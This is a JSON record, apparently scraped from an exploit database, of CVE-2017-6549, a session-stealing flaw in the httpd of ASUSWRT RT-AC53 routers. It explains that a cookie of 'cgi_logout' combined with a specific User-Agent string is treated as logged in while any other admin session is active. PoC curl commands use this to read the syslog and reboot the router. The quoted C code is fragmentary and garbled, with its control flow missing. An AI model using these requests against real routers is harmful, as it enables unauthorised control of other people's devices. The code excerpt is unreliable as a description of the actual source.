{
    "text": "ecve : CVE-2017-6549 ， title : ASUSWRT RT-AC53 ( 3.0.0.4.380.6038 ) - Session Stealing - Hardware webapps Exploit ， verified : Not Verified ， exploit_detail : Session Stealing ， Component : httpd ， CVE : CVE-2017-6549 ， Vulnerability :  ， httpd uses the function search_token_in_list to validate if a user is logged into the admin interface by checking his asus_token value. There seems to be a branch which could be a failed attempt to build in a logout functionality. ， asus_token_t * search_token_in_list ( char * token , asus_token_t prev )  ， asus_token_t * ptr = head ;  ， asus_token_t * tmp = NULL ;  ， int found = 0 ;  ， char * cp = NULL ;  ， found = 1 ;  ， cp = strtok ( ptr->useragent , \"-\" )  ;  ， found = 1 ;  ， tmp = ptr ;  ， ptr = ptr->next ;  ，  * prev = tmp ;  ， If an attacker sets his cookie value to cgi_logout and puts asusrouter-Windows-IFTTT-1.0 into his User-Agent header he will be treated as signed-in if any other administrator session is active. ， PoC :  ，  # read syslog ， curl -H 'User-Agent : asusrouter-Windows-IFTTT-1.0' -H 'Cookie : asus_token=cgi_logout' ，  # reboot router ， curl -H 'User-Agent : asusrouter-Windows-IFTTT-1.0' -H 'Cookie : asus_token=cgi_logout' -d 'action_mode=reboot&action_script=&action_wait=70' ， Its possible to execute arbitrary commands on the router if any admin session is currently active.",
    "time": "2017-03-08"
}